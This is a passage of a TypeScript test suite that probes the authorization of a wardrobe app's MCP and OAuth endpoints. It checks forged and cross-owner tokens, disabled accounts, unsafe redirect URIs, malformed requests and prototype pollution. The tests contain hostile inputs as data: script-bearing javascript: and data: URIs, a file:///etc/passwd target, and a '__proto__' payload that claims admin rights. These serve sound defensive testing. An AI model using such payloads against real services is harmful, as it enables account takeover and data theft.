    const narrowed = await rpc(accessToken, toolsCall("garderobe_command", args()));
    expect(narrowed.status).toBe(403);
    await narrowed.text();
    expect(await fingerprint(other)).toEqual(before);
    // Disconnect: the access token, a refreshed token and the refresh token all stop.
    const grantId = (await activeGrants(other)).find((g) => g.client_name === "Narrowed assistant (test)")!.grant_id;
    expect((await other.api.post(`/v1/assistants/${grantId}/disconnect`, {})).status).toBe(200);
    // The disconnect is the owner's own change: the grant row is revoked. Nothing after it may change anything.
    expect((await sql<{ status: string }>("SELECT status FROM mcp_grants WHERE user_id = ? AND grant_id = ?", other.userId, grantId))[0]!.status).toBe("revoked");
    const disconnected = await fingerprint(other);
    expect((await rpc(accessToken, { jsonrpc: "2.0", id: 1, method: "tools/list" })).status).toBe(401);
    const refreshed = await tokenRequest({ grant_type: "refresh_token", refresh_token: refreshToken!, client_id: clientId, resource: MCP_URL });
    if (refreshed.ok) {
      const next = (await refreshed.json()) as { access_token: string };
      expect((await rpc(next.access_token, { jsonrpc: "2.0", id: 1, method: "tools/list" })).status).toBe(401);
    } else expect(refreshed.status).toBeGreaterThanOrEqual(400);
    expect(await fingerprint(other)).toEqual(disconnected);
    await mcp.close().catch(() => undefined);
  });

  it("refuses invented, truncated, swapped and cross-owner bearer tokens on the MCP endpoint", async () => {
    const mine = await connectMcp(other, { write: false, clientName: "Token shape probe (test)", redirectUri: "https://shape.client.test/cb" });
    const { accessToken, refreshToken } = mine.oauth.snapshot();
    const victimGrant = await connectMcp(owner, { write: false, clientName: "Victim's reader (test)", redirectUri: "https://victim.client.test/cb" });
    const victimGrantId = (await activeGrants(owner)).find((g) => g.client_name === "Victim's reader (test)")!.grant_id;
    const parts = accessToken.split(":");
    const tokens: [string, string][] = [
      ["empty", ""],
      ["random", b64url(crypto.getRandomValues(new Uint8Array(48)))],
      ["truncated", accessToken.slice(0, -4)],
      ["extended", `${accessToken}AAAA`],
      ["the refresh token", refreshToken!],
      ["victim user id in the attacker's token", [owner.userId, ...parts.slice(1)].join(":")],
      ["victim grant id in the attacker's token", parts.length >= 3 ? [parts[0], victimGrantId, ...parts.slice(2)].join(":") : `${owner.userId}:${victimGrantId}:${parts.at(-1)}`],
      ["victim ids with an invented secret", `${owner.userId}:${victimGrantId}:${b64url(crypto.getRandomValues(new Uint8Array(32)))}`],
      ["an Access assertion of the victim", await accessAssertion(owner.identity)],
    ];
    const victimShirt = (await sql<{ garment_id: string }>("SELECT garment_id FROM garments WHERE user_id = ? LIMIT 1", owner.userId))[0]!.garment_id;
    for (const [label, token] of tokens) {
      const response = await rpc(token, toolsCall("garderobe_inventory", { view: "snapshot" }));
      const text = await response.text();
      expect(response.status, label).toBe(401);
      expect(text, label).not.toContain(victimShirt);
    }
    // The attacker's valid token on the app hostname's /mcp path, and with hostile props in the body.
    const onApp = await rpc(accessToken, toolsCall("garderobe_inventory", { view: "snapshot" }), {}, APP_ORIGIN);
    expect(onApp.status).toBeGreaterThanOrEqual(401);
    await onApp.text();
    const withProps = await rpc(accessToken, { ...toolsCall("garderobe_inventory", { view: "snapshot" }), props: { userId: owner.userId, grantId: victimGrantId }, auth: { userId: owner.userId } });
    expect(await withProps.text()).not.toContain(victimShirt);
    await mine.close();
    await victimGrant.close();
  });

  it("keeps a disabled account's sign-in and tokens out, and lets nothing through afterwards", async () => {
    // A throwaway synthetic owner whose account is disabled directly in the database (as deletion does first).
    const { syntheticOwner } = await import("../src/harness.ts");
    const doomed = await syntheticOwner("Synthetic owner to be disabled (test fixture)");
    const mcp = await connectMcp(doomed, { write: true, clientName: "Assistant of a disabled account (test)", redirectUri: "https://disabled.client.test/cb" });
    const { accessToken, refreshToken, clientId } = mcp.oauth.snapshot();
    await sql("UPDATE users SET status = 'disabled' WHERE user_id = ? RETURNING user_id", doomed.userId);
    const before = await fingerprint(doomed);
    const signIn = await doomed.api.get("/v1/me");
    expect(signIn.status).toBe(403);
    expect((await errorOf(signIn)).code).toBe("account_disabled");
    const command = await doomed.api.command("care.mark_dirty", { items: [{ garmentId: "shirt-gold", quantity: 1 }] });
    expect(command.status).toBe(403);
    await command.text();
    expect((await rpc(accessToken, toolsCall("garderobe_command", { type: "care.mark_dirty", payload: { items: [{ garmentId: "shirt-gold", quantity: 1 }] }, idempotencyKey: `adv-disabled-${crypto.randomUUID()}` }))).status).toBe(401);
    const refreshed = await tokenRequest({ grant_type: "refresh_token", refresh_token: refreshToken!, client_id: clientId, resource: MCP_URL });
    if (refreshed.ok) expect((await rpc(((await refreshed.json()) as { access_token: string }).access_token, { jsonrpc: "2.0", id: 1, method: "tools/list" })).status).toBe(401);
    else await refreshed.text();
    // A disabled account cannot be re-entered by claiming, linking or recovering either.
    const stranger = new ApiClient(newIdentity("adv-after-disable"));
    const tx = await stranger.json("POST", "/auth/recovery/start", {});
    const recovery = await stranger.post("/auth/recovery/complete", { transactionId: tx.transactionId, recoveryCode: doomed.recoveryKit.recoveryCode });
    expect(recovery.status).toBeGreaterThanOrEqual(400);
    await recovery.text();
    expect((await stranger.get("/v1/me")).status).toBe(403);
    expect(await fingerprint(doomed)).toEqual(before);
    await mcp.close().catch(() => undefined);
  });
});

describe("client registration and protocol edges", () => {
  it("does not let a client register or use a redirect target that is not a web or loopback address of its own", async () => {
    const unsafe = /^\s*(javascript|data|file|vbscript):/i;
    for (const uri of ["javascript:alert(document.domain)", "data:text/html,<script>alert(1)</script>", "file:///etc/passwd", "vbscript:msgbox(1)"]) {
      const response = await SELF.fetch(`${MCP_ORIGIN}/oauth/register`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ client_name: "Scheme probe (test)", redirect_uris: [uri], grant_types: ["authorization_code"], response_types: ["code"], token_endpoint_auth_method: "none" }) });
      const registration = await response.text();
      if (!response.ok) {
        // Refused at registration (good): with a client error, never a server error.
        expect(response.status, `${uri}: registration`).toBeGreaterThanOrEqual(400);
        expect(response.status, `${uri}: registration`).toBeLessThan(500);
        continue;
      }
      // Registered: the consent page and the owner's approval must each refuse explicitly, never redirect to it.
      const clientId = (JSON.parse(registration) as { client_id: string }).client_id;
      const opened = await openConsent(owner, authorizeUrl({ clientId, redirectUri: uri, verifier: "", challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" }));
      expect(opened.location ?? "", `${uri}: consent page redirect`).not.toMatch(unsafe);
      expect(opened.location ?? "", `${uri}: consent page redirect`).not.toContain("code=");
      if (opened.handle === null) {
        expect(opened.status, `${uri}: consent page refusal`).toBeGreaterThanOrEqual(400);
        expect(opened.status, `${uri}: consent page refusal`).toBeLessThan(500);
        continue;
      }
      const approved = await SELF.fetch(`${APP_ORIGIN}/oauth/authorize`, {
        method: "POST",
        headers: await owner.api.with({ client: "web" }).headers({ "Content-Type": "application/x-www-form-urlencoded", Cookie: opened.cookies }),
        body: new URLSearchParams({ handle: opened.handle, decision: "approve", scope: "wardrobe.write" }).toString(),
        redirect: "manual",
      });
      await approved.text();
      expect(approved.status, `${uri}: approval refused because of the redirect target, not the rate limit`).not.toBe(429);
      expect(approved.status, `${uri}: approval refusal`).toBeGreaterThanOrEqual(400);
      expect(approved.status, `${uri}: approval refusal`).toBeLessThan(500);
      expect(approved.headers.get("Location") ?? "", `${uri}: approval redirect`).not.toMatch(unsafe);
    }
    expect(await sql("SELECT user_id, grant_id FROM mcp_grants WHERE client_name = ?", "Scheme probe (test)"), "grants for a client with an unsafe redirect target").toEqual([]);
  });

  it("answers malformed MCP and OAuth requests with a client error, never a server error or a token", async () => {
    const mcp = await connectMcp(other, { write: false, clientName: "Malformed request probe (test)", redirectUri: "https://malformed.client.test/cb" });
    const token = mcp.oauth.snapshot().accessToken;
    const bodies: string[] = ["", "{", "[]", "null", "0", '"tools/call"', JSON.stringify({ jsonrpc: "1.0", id: 1, method: "tools/list" }), JSON.stringify({ jsonrpc: "2.0", id: { a: 1 }, method: "tools/call", params: null }), JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "garderobe_inventory", arguments: "view=snapshot" } }), JSON.stringify({ jsonrpc: "2.0", id: 1, method: "__proto__" }), `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"garderobe_inventory","arguments":${"[".repeat(5000)}${"]".repeat(5000)}}}`];
    for (const body of bodies) {
      const label = body.slice(0, 60);
      const response = await SELF.fetch(`${MCP_ORIGIN}/mcp`, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json, text/event-stream", Authorization: `Bearer ${token}` }, body });
      const text = await response.text();
      expect(response.status, label).toBeLessThan(500);
      // Refused with an HTTP client error, or answered only with JSON-RPC errors (or a tool's own error
      // result); never a served call.
      if (response.status >= 400) continue;
      expect(response.status, `${label}: not a client error, so a JSON-RPC answer`).toBeGreaterThanOrEqual(200);
      expect(response.status, `${label}: not a client error, so a JSON-RPC answer`).toBeLessThan(300);
      const messages = rpcMessages(text);
      expect(messages.length, `${label}: JSON-RPC answers`).toBeGreaterThan(0);
      expect(messages.filter(isToolSuccess).length, `${label}: served tool calls`).toBe(0);
      expect(messages.every((m) => isRpcError(m) || isToolFailure(m)), `${label}: every answer is an error`).toBe(true);
    }
    for (const method of ["GET", "DELETE", "PUT"]) {
      const response = await SELF.fetch(`${MCP_ORIGIN}/mcp`, { method, headers: { Authorization: `Bearer ${token}`, Accept: "text/event-stream" } });
      expect(response.status, method).toBeLessThan(500);
      await response.body?.cancel();
    }
    for (const form of [{}, { grant_type: "password", username: owner.identity.email!, password: "x" }, { grant_type: "client_credentials", client_id: "x" }, { grant_type: "authorization_code" }, { grant_type: "refresh_token", refresh_token: "x" }, { grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer", assertion: await accessAssertion(owner.identity) }, { grant_type: "urn:ietf:params:oauth:grant-type:token-exchange", subject_token: await accessAssertion(owner.identity), subject_token_type: "urn:ietf:params:oauth:token-type:jwt" }]) {
      const response = await tokenRequest(form as Record<string, string>);
      const text = await response.text();
      expect(response.status, JSON.stringify(form).slice(0, 60)).toBeGreaterThanOrEqual(400);
      expect(response.status).toBeLessThan(500);
      expect(text).not.toContain("access_token");
    }
    expect(toolResult(await mcp.client.callTool({ name: "garderobe_inventory", arguments: { view: "laundry" } })).ok).toBe(true);
    await mcp.close();
  });

  it('treats a "__proto__" member in tool arguments as data: no prototype is polluted and no other owner is served', async () => {
    const mcp = await connectMcp(other, { write: false, clientName: "Prototype probe (test)", redirectUri: "https://proto.client.test/cb" });
    const token = mcp.oauth.snapshot().accessToken;
    const send = (body: string) => SELF.fetch(`${MCP_ORIGIN}/mcp`, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json, text/event-stream", Authorization: `Bearer ${token}` }, body });
    // Control: the same call without the member is served, with the attacker's own snapshot.
    const control = await send(JSON.stringify(toolsCall("garderobe_inventory", { view: "snapshot" })));
    const controlText = await control.text();
    expect(control.status, "the control call").toBe(200);
    expect(rpcMessages(controlText).some(isToolSuccess), "the control call is served").toBe(true);
    // The probe is JSON TEXT: in an object literal `__proto__` sets the prototype and is never transmitted.
    const body = `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"garderobe_inventory","arguments":{"view":"snapshot","__proto__":{"userId":${JSON.stringify(owner.userId)},"isAdmin":true}}}}`;
    expect(body).toContain('"__proto__":{"userId":');
    const sentArguments = (JSON.parse(body) as { params: { arguments: Record<string, unknown> } }).params.arguments;
    expect(Object.prototype.hasOwnProperty.call(sentArguments, "__proto__"), "the transmitted arguments carry an own __proto__ member").toBe(true);
    const prototypeNames = Object.getOwnPropertyNames(Object.prototype).sort();
    const response = await send(body);
    const text = await response.text();
    expect(response.status).toBeLessThan(500);
    // Nothing of the victim: none of its garment identifiers (an identifier that also occurs in the attacker's
    // own control answer proves nothing and is left out).
    const victimIds = (await sql<{ garment_id: string }>("SELECT garment_id FROM garments WHERE user_id = ?", owner.userId)).map((row) => row.garment_id).filter((id) => !controlText.includes(id));
    expect(victimIds.length, "victim garment identifiers to look for").toBeGreaterThan(0);
    expect(victimIds.filter((id) => text.includes(id)).length, "victim garment identifiers in the answer").toBe(0);
    // No prototype was polluted. Under @cloudflare/vitest-pool-workers the test file and the Worker's `main` module run
    // in the same workerd isolate (SELF is the runner worker's own default export; that is why module mocks in a test
    // reach the Worker's handlers), so the Worker's Object.prototype is the one read here.
    expect(Object.getOwnPropertyNames(Object.prototype).sort()).toEqual(prototypeNames);
    expect(({} as Record<string, unknown>).userId).toBeUndefined();
    expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    // Served as the attacker's own call (the member ignored), or refused: with a client error or an error answer.
    if (response.status < 400) {
      expect(response.status).toBe(200);
      const messages = rpcMessages(text);
      expect(messages.length, "JSON-RPC answers").toBeGreaterThan(0);
      expect(messages.every((m) => isToolSuccess(m) || isRpcError(m) || isToolFailure(m)), "every answer is a tool result or an error").toBe(true);
    }
    // The grant still serves the attacker its own wardrobe.
    expect(toolResult(await mcp.client.callTool({ name: "garderobe_inventory", arguments: { view: "laundry" } })).ok).toBe(true);
    await mcp.close();
  });
});
